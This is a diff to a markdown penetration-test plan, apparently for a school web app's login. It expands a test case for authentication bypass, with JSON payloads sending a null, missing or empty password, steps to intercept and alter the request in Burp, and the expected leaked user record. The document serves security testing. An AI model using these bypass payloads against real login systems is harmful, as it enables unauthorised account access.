@@ -189,33 +189,77 @@ Original response:
 
 ---
 
-## Test Case 4: Authentication Bypass with NULL Password
+## 🔧 Test Case 4: Authentication Bypass with NULL Password
+
+### Goal
+Demonstrate that missing/null password parameters bypass validation.
 
 ### Steps
 
-**Step 1: Create Attack Payload**
+**Step 1: Create Attack Payload - Option A (Explicit NULL)**
+
 ```json
 {
-  "username": "professor1",
+  "username": "student1",
   "password": null
 }
 ```
 
-OR
+**Step 2: Create Attack Payload - Option B (Missing Field)**
 
 ```json
 {
-  "username": "professor1"
+  "username": "student1"
 }
 ```
 
-**Step 2: Forward Request**
+**Step 3: Create Attack Payload - Option C (Empty String)**
 
-**Step 3: Check if Backend Accepts NULL/Missing Password**
+```json
+{
+  "username": "student1",
+  "password": ""
+}
+```
 
-Expected vulnerable behavior:
-- Login succeeds because password validation is missing
-- Any username can be accessed
+**Step 4: Intercept Login and Modify**
+
+Original:
+```json
+{
+  "username": "student1",
+  "password": "student123"
+}
+```
+
+Attack (Option A):
+```json
+{
+  "username": "student1",
+  "password": null
+}
+```
+
+**Step 5: Forward Request in Burp**
+
+**Step 6: Observe Response**
+
+Expected vulnerable response:
+```json
+{
+  "message": "Login successful",
+  "user": {
+    "id": 1,
+    "username": "student1",
+    "role": "student",
+    "email": "student1@example.com"
+  }
+}
+```
+
+### ✅ Expected Result
+- Login succeeds with NULL or missing password → **VULNERABILITY CONFIRMED**
+- Backend accepts any password value (including null/undefined)
 
 ---
 
